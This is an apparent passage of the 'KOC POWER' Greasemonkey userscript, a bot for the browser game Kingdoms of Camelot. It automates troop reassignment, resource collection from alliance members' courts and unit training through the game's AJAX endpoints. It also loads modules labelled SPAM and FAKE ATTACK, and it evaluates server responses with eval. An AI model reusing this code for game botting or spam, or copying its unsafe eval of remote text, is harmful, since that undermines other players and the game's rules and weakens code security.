  var Sendu1 = document.getElementById('pb'+troops[1]).checked;  var Sendu2 = document.getElementById('pb'+troops[2]).checked;  var Sendu3 = document.getElementById('pb'+troops[3]).checked;  var Sendu4 = document.getElementById('pb'+troops[4]).checked;  var Sendu5 = document.getElementById('pb'+troops[5]).checked;  var Sendu6 = document.getElementById('pb'+troops[6]).checked;  var Sendu7 = document.getElementById('pb'+troops[7]).checked;  var Sendu8 = document.getElementById('pb'+troops[8]).checked;  var Sendu9 = document.getElementById('pb'+troops[9]).checked;  var Sendu10 = document.getElementById('pb'+troops[10]).checked;  var Sendu11 = document.getElementById('pb'+troops[11]).checked;  var Sendu12 = document.getElementById('pb'+troops[12]).checked;
  var u1 = document.getElementById('pbtarget'+troops[1]).value;  var u2 = document.getElementById('pbtarget'+troops[2]).value;  var u3 = document.getElementById('pbtarget'+troops[3]).value;  var u4 = document.getElementById('pbtarget'+troops[4]).value;  var u5 = document.getElementById('pbtarget'+troops[5]).value;  var u6 = document.getElementById('pbtarget'+troops[6]).value;  var u7 = document.getElementById('pbtarget'+troops[7]).value;  var u8 = document.getElementById('pbtarget'+troops[8]).value;  var u9 = document.getElementById('pbtarget'+troops[9]).value;  var u10 = document.getElementById('pbtarget'+troops[10]).value;  var u11 = document.getElementById('pbtarget'+troops[11]).value;  var u12 = document.getElementById('pbtarget'+troops[12]).value;
  var target_x = document.getElementById('ptcityX').value;  var target_y = document.getElementById('ptcityY').value;
    
  var lRE = t.reassignRoutes;
    lRE.push({    city:        city,    target_x:      target_x,    target_y:      target_y,    Sendu1:  Sendu1,    u1:    u1,    Sendu2:    Sendu2,    u2:      u2,    Sendu3:      Sendu3,    u3:        u3,    Sendu4:     Sendu4,    u4:       u4,    Sendu5:    Sendu5,    u5:      u5,    Sendu6:    Sendu6,    u6:      u6,    Sendu7:     Sendu7,    u7:       u7,    Sendu8:  Sendu8,    u8:    u8,    Sendu9:  Sendu9,    u9:    u9,    Sendu10:     Sendu10,    u10:       u10,    Sendu11:  Sendu11,    u11:    u11,    Sendu12:    Sendu12,    u12:      u12,    });
  document.getElementById('pbReassignDivD').style.background ='#99FF99';
  setTimeout(function(){ (document.getElementById('pbReassignDivD').style.background =''); }, 1000);
  },
  
  showReassignRoutes: function () {
  var t = Tabs.Reassign;
  var popReassignRoutes = null;
  t.popReassignRoutes = new CPopup('pbShowTrade', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
  var m = '<DIV style="max-height:460px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbShowReassignRoutes" id="pbRoutesQueue">';       
  t.popReassignRoutes.getMainDiv().innerHTML = '</table></div>' + m;
  t.popReassignRoutes.getTopDiv().innerHTML = '<TD><div class=showBadged><center>'+culang.reassign+'</center></div></td>';
  t.paintReassignRoutes();
  t._addTabHeader();
  t.popReassignRoutes.show(true)  ;
  },
  paintReassignRoutes: function(){
      var t = Tabs.Reassign;
      var r = t.reassignRoutes;
      var cityname;
    for (var i = (r.length-1); i>=0; i--) {
    for (var y=0; y< Seed.cities.length;y++) {
      if ( parseInt(Seed.cities[y][0]) == r[i].city) var cityname = Seed.cities[y][1];
    }    
    var queueId = i;
    t._addTab(queueId,cityname, r[i].target_x, r[i].target_y, r[i].Sendu1,r[i].u1, r[i].Sendu2, r[i].u2, r[i].Sendu3, r[i].u3, r[i].Sendu4, r[i].u4, r[i].Sendu5, r[i].u5, r[i].Sendu6, r[i].u6, r[i].Sendu7, r[i].u7, r[i].Sendu8, r[i].u8, r[i].Sendu9, r[i].u9, r[i].Sendu10, r[i].u10, r[i].Sendu11, r[i].u11, r[i].Sendu12, r[i].u12);
      }
    },
  
   _addTab: function(queueId,cityname,target_x,target_y,Sendu1,u1,Sendu2,u2,Sendu3,u3,Sendu4,u4,Sendu5,u5,Sendu6,u6,Sendu7,u7,Sendu8,u8,Sendu9,u9,Sendu10,u10,Sendu11,u11,Sendu12,u12){
   var t = Tabs.Reassign;
     var row = document.getElementById('pbRoutesQueue').insertRow(0);
     row.vAlign = 'top';
     row.insertCell(0).innerHTML = queueId;
     row.insertCell(1).innerHTML = cityname;
     row.insertCell(2).innerHTML = target_x + ',' + target_y;
     row.insertCell(3).innerHTML = Sendu1;
     row.insertCell(4).innerHTML = addCommas(u1);
     row.insertCell(5).innerHTML = Sendu2;
     row.insertCell(6).innerHTML = addCommas(u2);
    row.insertCell(7).innerHTML = Sendu3;
    row.insertCell(8).innerHTML = addCommas(u3);
    row.insertCell(9).innerHTML = Sendu4;
    row.insertCell(10).innerHTML = addCommas(u4);
    row.insertCell(11).innerHTML = Sendu5;
    row.insertCell(12).innerHTML = addCommas(u5);
    row.insertCell(13).innerHTML = Sendu6;
    row.insertCell(14).innerHTML = addCommas(u6);
    row.insertCell(15).innerHTML = Sendu7;
    row.insertCell(16).innerHTML = addCommas(u7);
    row.insertCell(17).innerHTML = Sendu8;
    row.insertCell(18).innerHTML = addCommas(u8);
    row.insertCell(19).innerHTML = Sendu9;
    row.insertCell(20).innerHTML = addCommas(u9);
    row.insertCell(21).innerHTML = Sendu10;
    row.insertCell(22).innerHTML = addCommas(u10);
    row.insertCell(23).innerHTML = Sendu11;
    row.insertCell(24).innerHTML = addCommas(u11);
    row.insertCell(25).innerHTML = Sendu12;
    row.insertCell(26).innerHTML = addCommas(u12);
     row.insertCell(27).innerHTML = '<a class="button20" id="tradecancel_' + queueId + '"><span>'+culang.deleteb+'</span></a>';
     document.getElementById('tradecancel_' + queueId).addEventListener('click', function(){
      t.cancelQueueElement(queueId);
     }, false);
   },
   
   _addTabHeader: function() {
   var t = Tabs.Reassign;
     var row = document.getElementById('pbRoutesQueue').insertRow(0);
     row.vAlign = 'top';
     row.insertCell(0).innerHTML = "ID";
     row.insertCell(1).innerHTML = culang.from;
     row.insertCell(2).innerHTML = culang.to;
     row.insertCell(3).innerHTML = culang.shrsupply;
     row.insertCell(4).innerHTML = "";
     row.insertCell(5).innerHTML = culang.shrmilitiaman;
     row.insertCell(6).innerHTML = "";
    row.insertCell(7).innerHTML = culang.scout;
     row.insertCell(8).innerHTML = "";
     row.insertCell(9).innerHTML = culang.shrpikeman;
     row.insertCell(10).innerHTML = "";
     row.insertCell(11).innerHTML = culang.shrswordsman;
     row.insertCell(12).innerHTML = "";
     row.insertCell(13).innerHTML = culang.shrtarcher;
     row.insertCell(14).innerHTML = "";
     row.insertCell(15).innerHTML = culang.shrcavalry;
     row.insertCell(16).innerHTML = "";
     row.insertCell(17).innerHTML = culang.shrheavycavalry;
     row.insertCell(18).innerHTML = "";
     row.insertCell(19).innerHTML = culang.shrsupplywagon;
     row.insertCell(20).innerHTML = "";
     row.insertCell(21).innerHTML = culang.shrballista;
     row.insertCell(22).innerHTML = "";
     row.insertCell(23).innerHTML = culang.shrbatteringram;
     row.insertCell(24).innerHTML = "";
     row.insertCell(25).innerHTML = culang.shrcatapult;
     row.insertCell(26).innerHTML = "";
     row.insertCell(27).innerHTML = culang.deleteb;
   },   
   
	cancelQueueElement: function(queueId){     var t = Tabs.Reassign;     var queueId = parseInt(queueId);     t.reassignRoutes.splice(queueId, 1);     t.showReassignRoutes();   },
	saveReassignRoutes: function(){  var t = Tabs.Reassign;    var serverID = getServerId();    GM_setValue('reassignRoutes_' + serverID, JSON2.stringify(t.reassignRoutes));  },
  readReassignRoutes: function(){
    var t = Tabs.Reassign;
    var serverID = getServerId();
    s = GM_getValue('reassignRoutes_' + serverID);
    if (s != null) {
      route = JSON2.parse(s);
      for (k in route)
        t.reassignRoutes[k] = route[k];
    }
  },
  saveReassignState: function(){  var t = Tabs.Reassign;    var serverID = getServerId();    GM_setValue('reassignState_' + serverID, JSON2.stringify(t.reassignState));  },
  readReassignState: function(){
    var t = Tabs.Reassign;
    var serverID = getServerId();
    s = GM_getValue('reassignState_' + serverID);
    if (s != null) {
      state = JSON2.parse(s);
      for (k in state)
        t.reassignState[k] = state[k];
    }
  },
	toggleReassignState: function(obj){  var t = Tabs.Reassign;    if (t.reassignState.running == true) {      t.reassignState.running = false;      obj.value = ""+culang.autoreassign+" = "+culang.buttonoff;   t.checkdoreassigntimeout = null;    t.count = 0;    } else {      t.reassignState.running = true;      obj.value = ""+culang.autoreassign+" = "+culang.buttonon;    t.e_reassignRoutes();    } },
	checkdoReassign: function(){  var t = Tabs.Reassign;  t.doReassign(t.count);  t.count++;  if(t.count < t.reassignRoutes.length && t.reassignState.running){    t.checkdoreassigntimeout = setTimeout(function() { t.checkdoReassign();}, 5000);  } else {    var now = new Date().getTime()/1000.0;    now = now.toFixed(0);    Options.lastreassign = now;    saveOptions();      t.count = 0;  }},
  
  doReassign: function(count){
    var t = Tabs.Reassign;
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
     if(t.reassignRoutes.length==0) return;
     var send=[];
     var citytotal=0;
     var totalsend=0;
		params.u1 = 0;		params.u2 = 0;		params.u3 = 0;		params.u4 = 0;		params.u5 = 0;		params.u6 = 0;		params.u7 = 0;		params.u8 = 0;		params.u9 = 0;		params.u10 = 0;		params.u11 = 0;		params.u12 = 0;  
    
    var city = t.reassignRoutes[count]["city"];
    var xcoord = t.reassignRoutes[count]["target_x"];
    var ycoord = t.reassignRoutes[count]["target_y"];
    
    var cityID = 'city' + city;
	if(!Cities.byID[city]) return;
    var marching = getMarchInfo2(cityID);
    t.getRallypoint(cityID);
  if(t.rallypointlevel == 11) t.rallypointlevel = 15;
else if(t.rallypointlevel == 12) t.rallypointlevel = 20;
    var maxsend = (t.rallypointlevel * 10000);
    totalsend=0;
       	var troopsselect=["u1","u2","u3","u4","u5","u6","u7","u8","u9","u10","u11","u12"];
    	for (k=0; k<troopsselect.length; k++) {
			var citytroops = Seed.units[cityID]['unt'+(parseInt(k)+1)];
			var marchtroops = marching.marchUnits[parseInt(k)+1];
			citytotal = parseInt(citytroops) + parseInt(marchtroops);
			//alert(citytotal + ' > ' + t.reassignRoutes[count][troopsselect[k]] + ' - ' + totalsend + ' <= ' + maxsend + ' - ' + t.reassignRoutes[count]['Send'+troopsselect[k]]);
			//if(k== 5) GM_log(citytotal +'  ' + t.reassignRoutes[count][troopsselect[k]]);
			if(t.reassignRoutes[count]['Send'+troopsselect[k]]==false) {continue; }
			if(citytotal > t.reassignRoutes[count][troopsselect[k]]){
				var sendtroops = parseInt(citytotal) - parseInt(t.reassignRoutes[count][troopsselect[k]]);
				if (parseInt(sendtroops) > parseInt(citytroops)) sendtroops = citytroops;
				if (parseInt(sendtroops) < 0) sendtroops = 0;
				send[(parseInt(k)+1)] = sendtroops;
				totalsend += send[(parseInt(k)+1)];
				//alert(parseInt(k)+1 + ' - ' + citytotal+ ' : ' + troopsselect[k] + ' / ' + t.reassignRoutes[0][troopsselect[k]]);    			
				
			}
			if(totalsend > maxsend){
				totalsend -= send[(parseInt(k)+1)];
				send[(parseInt(k)+1)] = parseInt(maxsend-totalsend);
				totalsend += send[(parseInt(k)+1)];
				break;
			}
       	}
    	
    	for (var t=0; t< Seed.cities.length;t++) {
    		if ( parseInt(Seed.cities[t][0]) == city) var cityname = Seed.cities[t][1];
    	}
    
		params.cid= city;		params.type = "5";		params.kid=0;		params.xcoord = xcoord;		params.ycoord = ycoord;		params.u1 = send[1];		params.u2 = send[2];		params.u3 = send[3];		params.u4 = send[4];		params.u5 = send[5];		params.u6 = send[6];		params.u7 = send[7];		params.u8 = send[8];		params.u9 = send[9];		params.u10 = send[10];		params.u11 = send[11];		params.u12 = send[12];  
  
     if (totalsend >0) {
      new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
          method: "post",
          parameters: params,
          loading: true,
          onSuccess: function (transport) {
          var rslt = eval("(" + transport.responseText + ")");
          if (rslt.ok) {
          actionLog('<b>'+culang.autoreassign+'</b> '+culang.from+': ' + cityname + ' '+culang.to+': ' + xcoord + ',' + ycoord + '    ->   '+culang.fortroops+': ' + totalsend);
          var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
          var ut = unsafeWindow.unixtime();
          var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
              for(i = 0; i <= unitsarr.length; i++){
                if(params["u"+i]){
                  unitsarr[i] = params["u"+i];
                }
              }
          var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
          var currentcityid = city;
          unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
          if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
          } else {
          actionLog('<b>'+culang.autoreassign+'</b> <i>'+culang.at+'</i> <b>' + cityname+'</b> ' + rslt.error_code + ' <BR>  ' + rslt.msg + ' <BR>  ' + rslt.feedback+'');
          }
          },
          onFailure: function () {}
      });
    }      
  },
    
  show: function(){  var t = Tabs.Reassign;   mainPop.div.style.width = 750 + 'px';   if (Options.widescreen==true) { mainPop.div.style.width = Colors.PopUpWidth + 'px'; }  },
  hide: function(){  var t = Tabs.Reassign;     mainPop.div.style.width = 750 + 'px';   if (Options.widescreen==true) { mainPop.div.style.width = Colors.PopUpWidth + 'px'; }  },
  onUnload: function(){
    var t = Tabs.Reassign;
    if (!ResetAll) t.saveReassignRoutes();
  if (!ResetAll) t.saveReassignState();
    
  },
}




/************************************************************************************
*						KOC POWER - TABS THRONE										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_THRONE' ));
/************************************************************************************
*						KOC POWER - TABS MOVEMENT									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_MOVEMENT' ));
/************************************************************************************
*						KOC POWER - TABS SPAM										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_SPAM' ));
/************************************************************************************
*						KOC POWER - TABS MAP										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_MAP' ));
/************************************************************************************
*						KOC POWER - TABS FAKE ATTACK								*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_FAKE' ));
/************************************************************************************
*						KOC POWER - TABS TOURNAMENT									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_TOURNAMENT' ));
/************************************************************************************
*						KOC POWER - TABS ACTIONLOG									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_ACTIONLOG' ));

function actionLog (msg){
  if (!Tabs.ActionLog.tabDisabled)
    Tabs.ActionLog.log (msg);
}
/************************************************************************************
*						KOC POWER - TABS RESOURCE									*
************************************************************************************/
Tabs.Resources = {  tabLabel : culang.resource,  tabOrder : StyleOptions.toRessis,   tabDisabled : StyleOptions.disResTab,  resource : {1:''+culang.food+'', 2:''+culang.wood+'', 3:''+culang.stone+'', 4:''+culang.ore+''},  users : [],  myDiv : null,  doList : [],  accepting : false,  city : null,  total : {gold:0, 1:0, 2:0, 3:0, 4:0},
  init : function (div){    var t = Tabs.Resources;		t.myDiv = div;		 t.myDiv.style.overflowY = 'auto';    div.innerHTML = '<DIV class=pdxStat>'+culang.Hvisit+'</div><TABLE cellpadding=0 cellspacing=0 class=pdxTab width=100%><TR><TD align=center><INPUT id="pballlist" type=submit value="'+culang.srcplayr+'" \></td></tr></table><DIV id=resDiv >'; document.getElementById('pballlist').addEventListener ('click', t.e_clickfetchlist, false);  },
  show : function (){  var t = Tabs.Resources;  mainPop.div.style.width = 750 + 'px';    if (Options.widescreen==true) { mainPop.div.style.width = Colors.PopUpWidth + 'px'; }  },
  hide : function (){  var t = Tabs.Resources;  mainPop.div.style.width = 750 + 'px';    if (Options.widescreen==true) { mainPop.div.style.width = Colors.PopUpWidth + 'px'; }  },
  progress : function (msg, span, add){
	if(add)
		document.getElementById(span).innerHTML+=msg;
	else
		document.getElementById(span).innerHTML=msg;
  },

  e_clickfetchlist : function  (){ // (also cancel accepting)
    var t = Tabs.Resources;
	t.users = [];
    if (t.accepting){
      document.getElementById('pballlist').value = ''+culang.srcplayr+'';
      document.getElementById('resDiv').innerHTML+= '<BR><SPAN class=boldRed>'+culang.canceled+'.</span>';
      t.accepting = false;
      return;
    }
    document.getElementById('resDiv').innerHTML = '<div class=pdxStat>'+culang.Hplycourts+'</div><BR><b><CENTER>'+culang.searchplylist+' <b><font color=#600000> <span id=pbResUserListCount></span> </b></font></center></b>';
    
    t.fetchUserList (gotUserList);
    function gotUserList(userList){
		if(userList.length < 1){ listGifts(); return; }
		document.getElementById('resDiv').innerHTML += '<b><CENTER>'+culang.searchcourts+' <b><font color=#600000><span id=pbResUserAvailCount></span> </b></font></center></b>';
		t.checkDailyAction(userList, listGifts);
	}
    
    function listGifts (){
	  t.city = Cities.cities[0];
	  var m = '<DIV class=pdxStat><CENTER>'+culang.Hplycourts+': '+ t.users.length +' </center></div>';
      if (t.users.length<1){
        document.getElementById('resDiv').innerHTML = m + '<BR><BR><CENTER><b>'+culang.noplayerfound+' </b></center>';
        return;
      }
      m += '<TABLE class=pdxTab align=center><TR><TD align=right><b>'+culang.heiligtum+'</b>: </td><TD id=pbrescityselspan></td></tr>\
          <TR><TD align=right>'+culang.CTwhatres+'</td><TD>'
        + htmlSelector (t.resource, Options.getResType, 'id=pbResColType')
        + '</td></tr><TR><TD>'+culang.CTvisitc+' '+culang.CTvisitbtn+' '+culang.CTvisitc2+': </td><TD width=250><INPUT type=submit id=pbResDo value="'+culang.CTvisitbtn+'">\
        &nbsp; <SPAN id=pbResNone class=boldRed></span></td></tr></table><HR><center><TABLE class=pdxTab><TR valign=top><TD>\
        <INPUT id=pbResButAll type=submit value="'+culang.all+'" style="width:100%; margin-bottom:5px"><BR><INPUT id=pbResButNone type=submit value="'+culang.none+'"></td>\
        <TD width=10></td><TD><TABLE align=center cellpadding=0 cellspacing=0 class=pdxTabLined>\
        <TBODY  id=pbResTbody style="height:250px; overflow:auto; display:block;">\
        <TR style="font-weight:bold;"><TD>'+culang.name+'</td><TD>'+culang.might+'</td><TD width=20></td></tr>';
      for (var i=0; i<t.users.length; i++){
        m += '<TR><TD><INPUT type=checkbox id=pbrchk_'+ i +'> &nbsp;'+ t.users[i].name +'</td><TD>'+ t.users[i].might +'</td></tr>';
      }
      document.getElementById('resDiv').innerHTML = m + '</tbody></table></center></td></tr></table>';
	  new CdispCityPicker ('pbrescitysel', document.getElementById('pbrescityselspan'), true, t.e_CityButton, t.city.idx);
      document.getElementById('pbResDo').addEventListener ('click', t.getErDone, false);
      document.getElementById('pbResButAll').addEventListener ('click', t.e_butAll, false);
      document.getElementById('pbResButNone').addEventListener ('click', t.e_butNone, false);
    }
  },

  e_CityButton : function (city, x, y){    var t = Tabs.Resources;	t.city = city;  },
  
 e_butAll : function (){
		var t = Tabs.Resources;
		for (var i=0; i<t.users.length; i++)
		  document.getElementById('pbrchk_'+i).checked = true;
	  },
	  
	  e_butNone : function (){
		var t = Tabs.Resources;
		for (var i=0; i<t.users.length; i++)
		  document.getElementById('pbrchk_'+i).checked = false;
	  },
	  
	  getErDone : function (){
		var t = Tabs.Resources;
		t.doList = [];
		document.getElementById('pbResNone').innerHTML = '';
		Options.getResType = document.getElementById('pbResColType').value;
		t.total = {gold:0, 1:0, 2:0, 3:0, 4:0};
		for (var i=0; i<t.users.length; i++){
		  if (document.getElementById('pbrchk_'+i).checked)
			t.doList.push (t.users[i]);
		}
		if (t.doList.length==0){ document.getElementById('pbResNone').innerHTML = ''+culang.noselplyr+''; return; }
		t.accepting = true;
		document.getElementById('pballlist').value = ''+culang.GTstopAcc+'';
		document.getElementById('resDiv').innerHTML = '<div class=pdxStat>'+culang.Hvisitnowcourts+'</div><DIV id=rsltDiv style="height:400px; max-height:400px"><BR><B><u>'+culang.GTOacceptgift+' '+culang.from+' <span class=boldGreen>'+ t.doList.length +'</span> '+culang.player+':</u></b></div>';    
		t.acceptNext ();
	  },

  allDone : function (msg){
    var t = Tabs.Resources;
	msg += '<BR><BR> <b><u>'+culang.res+'</u></b> <BR> '+culang.gold+': '+addCommas(t.total.gold)+'<BR>';
	for(var i=1; i<=4; i++){		msg += t.resource[i]+': '+addCommas(t.total[i])+'<BR>';	}
    document.getElementById('rsltDiv').innerHTML += '<BR><BR>' + msg;
    document.getElementById('pballlist').value = ''+culang.srcplayr+'';
    t.accepting = false;
  },
  
    
  acceptNext : function (){
    var t = Tabs.Resources;
    var gift = t.doList.shift();
    if (gift == null){ t.allDone ('<b>'+culang.acceptresdone+'</b>');      return;    }
    var acpDiv = document.getElementById('rsltDiv');
    var curDiv = document.createElement ('div');
    acpDiv.appendChild (curDiv);
    curDiv.innerHTML = '<B>'+culang.from+' <b>'+ gift.name +'</b>: ';    
    var statSpan = document.createElement ('span');
    curDiv.appendChild (statSpan);
    statSpan.innerHTML = '<i>'+culang.accept+'... </i>';
    t.getCourtAction (gift, gotGiftData);
        
    function gotGiftData (rslt){ //logit ("getErDone.gotGiftData ... \n"+ inspect (gift, 8, 1));
      if (!t.accepting)
        return;
      if (rslt.ok){
        var msg = ' <span class=boldGreen>'+ rslt.gold +'</span> '+culang.actionGold1+' <span class=boldGreen>'+rslt.resource +'</span> '+ t.resource[rslt.resourcetype]+'&nbsp; &nbsp; <b><font color=green>'+culang.actionGold2+'</font></b>.';
		actionLog ('<b>'+culang.auto+' '+culang.res+'</b>: '+culang.actionresa+' <b>'+gift.name+'</b>: <span class=boldGreen>'+ rslt.gold +'</span> '+culang.actionGold4+' <span class=boldGreen>'+ rslt.resource +' </span>'+ t.resource[rslt.resourcetype]);
        statSpan.innerHTML += msg;
		t.total.gold += rslt.gold;
		t.total[rslt.resourcetype] += rslt.resource;
		t.acceptNext ();  
        return;
      }
        
      if (rslt.msg)
        msg = '<B>'+ rslt.msg + '</b>';
      else
        msg = '<SPAN class=boldRed>'+culang.Herror+': '+ rslt.ajaxErr +'</span>';

      curDiv.removeChild (statSpan);
      curDiv = document.createElement ('div');
      curDiv.className = 'indent25';
      acpDiv.appendChild (curDiv);
      curDiv.innerHTML = msg;
      t.acceptNext ();  
    }
    
  },

  getMembersInfo : function (pageNo, notify) { var t = Tabs.Resources;    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);    params.pageNo = pageNo;    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetMembersInfo.php" + unsafeWindow.g_ajaxsuffix, {      method: "post",      parameters: params,      onSuccess: function (rslt) { notify (rslt); }, onFailure: function (rslt) { notify ({errMsg:'Ajax Comm Error'}); },    });},
  getDailyAction : function (uid, notify){ var t = Tabs.Resources;    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);    params.pid = uid;    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/viewCourt.php" + unsafeWindow.g_ajaxsuffix, {      method: "post",      parameters: params,      onSuccess: function (rslt) { notify (rslt); },      onFailure: function (rslt) { notify ({errMsg:'Ajax Comm Error'}); },    }); },
  getCourtAction : function (gift, notify){
	var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    
    params.atype = Options.getResType;
	params.toid = gift.userId;
	params.givercityid = t.city.id;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/courtDoAction.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },
  
  checkDailyAction : function (userList, notify){
	var t = Tabs.Resources;
	var count = 0;
    t.getDailyAction(userList[count].userId, parseViewCourt);
	
	function parseViewCourt (rslt){
		if (!rslt.ok || rslt.errMsg)
			notify ({errMsg:'Ajax Comm Error'});
		if(rslt.dailyActionFlag == 0)
			t.users.push(userList[count]);
		t.progress(count, 'pbResUserAvailCount');
		count++;
		if(count < userList.length){ t.getDailyAction(userList[count].userId, parseViewCourt); } else { notify(); }
	}
  },
 
  fetchUserList : function (notify){  // notify with gifts[] or: {errMsg:xxx}
	var t = Tabs.Resources;
	var userList = [];
    t.getMembersInfo(1, parseAlliancePage);
	
    function parseAlliancePage (rslt){
      if (!rslt.ok || rslt.errMsg)
        notify ({errMsg:'Ajax Comm Error'});
	  var users = rslt.memberInfo;
      for(var k in users){
		userList.push({userId:users[k].userId, name:users[k].name, might:users[k].prestige, type:'alliance'});
	  }
	  t.progress(userList.length, 'pbResUserListCount');
	  if(rslt.currentPage < rslt.noOfPages){ t.getMembersInfo((rslt.currentPage+1), parseAlliancePage); } else { notify(userList); }
    }
  },
  
},
/************************************************************************************
*						KOC POWER - TABS AUTO TRAIN									*
************************************************************************************/
Tabs.AutoTrain= {	tabOrder: StyleOptions.toKaserne,	tabLabel: culang.autotrain,	cont : null,	nbfil : 0,	crfil : 0,	timer:null,	city : 0,	numcity :-1,
  init : function (div){ var t = Tabs.AutoTrain;  t.cont = div;  t.cont.innerHTML = ''; unsafeWindow.changeUnitType = t.ATchangeUnits;
    m = "<DIV class=pdxStat>"+culang.Hatrain+"</div>";
    m += "<TABLE width=720 class=pdxTab border=0 align=center><tr align=center valign=top><TD>"+culang.intervall+": <input id=aFtimelauch type=text size=2 value='"+parseInt(AutoTrainOptions.timelauch)+"'> "+culang.DFintervall2+"</td><TD>"
    if (AutoTrainOptions.Running == false) {
       m += '<INPUT id=pbAutoTrainState  type=submit value="'+culang.autotrain+' = '+culang.buttonoff+'">';
    } else {
       m += '<INPUT id=pbAutoTrainState  type=submit value="'+culang.autotrain+' = '+culang.buttonon+'">';
	   t.timer=setInterval(t.Start,parseInt(AutoTrainOptions.timelauch*1000));
    }
				
    m+="</td><TD><input type=button  value='"+culang.save+"' id=autoTrainSave></td></tr></table>";
     m += "<TABLE width=100% class=pdxTab border=0 align=center cellspacing=0 cellpadding=3><tr align=left><td align=left style='border-bottom:1px solid black' colspan=2></td><td  align=left style='border-bottom:1px solid black'><b><u>"+culang.holyplace+"</u></b></td><td align=left style='border-bottom:1px solid black'><b><u>"+culang.troops+"</u></b></td><td  align=left style='border-bottom:1px solid black'><b><u>"+culang.min+"</u></b></td><td  align=left style='border-bottom:1px solid black'><b>"+culang.max+"</b></td><td align=left style='border-bottom:1px solid black' colspan=2><b><u>"+culang.worker+"</u></b></td><tD  align=left style='border-bottom:1px solid black'><b><u>"+culang.speedups+"</u></b></td><td  align=center style='border-bottom:1px solid black'><b><u>"+culang.actionNote+"</u></b></td></tr>";
    var city=0;
    for (var c=0; c<Cities.numCities; c++) {
     cityId=Cities.cities[c].id;  
     city = c+1;
     m+="<tr><td rowspan=2 width=6% align=right style='border-bottom:1px solid black'><b>"+(c+1)+"</b></td><td align=right rowspan=2 style='border-bottom:1px solid black'>";
     if (AutoTrainOptions.listactif && AutoTrainOptions.listactif[cityId] == false) {
      m+="<input type=checkbox id='autoFCheck_"+cityId+"'>";
     }else {
      m+="<input checked type=checkbox id='autoFCheck_"+cityId+"'>";
     }
     m+="</td><td width=15% align=center  >"+Cities.cities[c].name+"</td><TD align=center><SELECT id='autoFType_"+cityId+"' onchange='changeUnitType("+cityId+",this.value);'>";
     for (r=1; r<13; r++){
      var faux = 0;
      var uc = unsafeWindow.unitcost['unt'+r];
      if (matTypeof(uc[8]) == 'object'){
            for (k in uc[8]){  // check building requirement
              var b = getCityBuilding (cityId, k.substr(1));
              if (b.maxLevel < uc[8][k][1]){
                faux = 1;
                break;
              }
            }
          }
          if (matTypeof(uc[9]) == 'object'){ for (k in uc[9]){ if (parseInt(Seed.tech['tch'+k.substr(1)]) < uc[9][k][1]){ faux = 1; break; } } }
       if (faux==0) {
	if (AutoTrainOptions.list) {
	   if (r==AutoTrainOptions.list[cityId]) {  m+= "<option selected value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>"; } else { m+= "<option value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>"; }
	}else{ if (r==2) { m+= "<option selected value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>"; } else { m+= "<option value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>"; } }
		} 
    } 
    if (AutoTrainOptions.unitemax[Cities.cities[c].id] == undefined) AutoTrainOptions.unitemax[Cities.cities[c].id] = 999999;
    if (isNaN(parseInt(AutoTrainOptions.unitemin[cityId]))) AutoTrainOptions.unitemin[cityId]=0 ;
    if (AutoTrainOptions.Keep[city] == undefined) AutoTrainOptions.Keep[city] ={};
    m+= "</select></td><td align=left><input type=text value='"+ parseInt(AutoTrainOptions.unitemin[cityId]) +"' id='aFunitemin_"+cityId+"' size=4></td><td align=left><input type=text value='"+ parseInt(AutoTrainOptions.unitemax[cityId]) +"' id='aFunitemax_"+cityId+"' size=5></td><td align=right>";
    
        if (AutoTrainOptions.listlabour && AutoTrainOptions.listlabour[cityId] == false) {
         m+="<input type=checkbox id='autoFWorkers_"+cityId+"'>";
        }else {
         m+="<input checked type=checkbox id='autoFWorkers_"+cityId+"'>";
    }
	m+="</td><td align=right>";
	m+='<SELECT class='+city+' id="workers'+city+'"><option value="0">0%</options>';
	m+='<option value="25">25%</options>';
	m+='<option value="50">50%</options>';
	m+='<option value="75">75%</options>';
	m+='<option value="100">100%</options>';
	m+="</td><td align=right>";
	m+="<select id='autoFboost_"+cityId+"'>";
	m+="<option value=0>"+culang.OwideOptnormal+"</option><option value=1 "+ (AutoTrainOptions.listboost[cityId]==1?'SELECTED ':'') +">5-15%</option><option value=2 "+ (AutoTrainOptions.listboost[cityId]==2?'SELECTED ':'') +">10-25%</option></select>";
	m+="</td><td align=right width=40%><span id='autoFError_"+cityId+"' style='font-style:italic;'></span></td></tr>"; 
